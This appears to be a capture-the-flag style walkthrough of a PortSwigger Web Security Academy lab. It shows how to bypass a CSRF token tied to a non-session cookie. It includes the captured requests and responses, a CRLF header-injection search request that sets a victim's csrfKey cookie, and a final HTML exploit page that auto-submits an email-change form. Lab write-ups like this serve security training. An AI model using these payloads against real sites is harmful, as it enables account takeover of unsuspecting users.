# Lab: CSRF where token is tied to non-session cookie
# https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

```bash
# Login to  wiener:peter and change your email to a@gmail.com

# Let's check change-email post request.

Cookie: session=tcekytBD3H7fLum72LM6HEN4AauDYdDU; csrfKey=NT4F5Fky5EZn61CX9pGCplPpMjHj9wDy

email=a%40gmail.com&csrf=hkzUfOciBAUt6oiSziSZPz0kk2NVEceG

# Send request to repeater
```
```bash
# Login to  carlos:montoya from new private window and let's take csrf value by inspecting searchbox.

<input required="" type="hidden" name="csrf" value="ysPJNQhBobfGOOZtWSnIVTmh9GgKUfDg">

# Open Network, reload the page and click on my-account?id=carlos and take cookies.

session=4rRLMKbckN4pSyEPCaZxM03Ulm6eDAor; csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR

```

```bash
# Go back to repeater and change csrfKey and csrf token to one that we took from carlos and send the request to wiener.

csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR
email=abc%40gmail.com&csrf=ysPJNQhBobfGOOZtWSnIVTmh9GgKUfDg

# Response:

HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

# Follow Redirection:
HTTP/2 200 OK

# It works
```
```bash
# We need a way to inject http headers to our target so let's check other requests.
# Search for word test on block.

# After we search for it we get new cookie called LastSearchTerm.

Set-Cookie: LastSearchTerm=test; Secure; HttpOnly

# Send the request to the repeater.
```

```bash
# Change the search part and send the request.

GET /?search=test%0d%0aSet-Cookie:%20csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR HTTP/2

# Response:
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR;

```

```bash
# Reload carlos and take csrf token and cookies .

```
```bash
# Payload:
# It took my hours to complete this lab due to weird gmail bug on this lab keep changing gmail if the code doesn't work on you.
<html>
 <body>
  <form action="https://0ad500450313b2a5806e802f0019000c.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="fla@gmail.com"/>
   <input type="hidden" name="csrf" value="JFNNHwDTvy3tmj6hox1LkSQm9jA2TZe8"/>
  </form>
 </body>
<img src="https://0ad500450313b2a5806e802f0019000c.web-security-academy.net/?search=blabla%0d%0aSet-Cookie%3a%20csrfKey=qgrDl0pW6UVb252z2lzrnn7xvxRIg3rj%3b%20SameSite=None" onerror="document.forms[0].submit()">
</html>
```
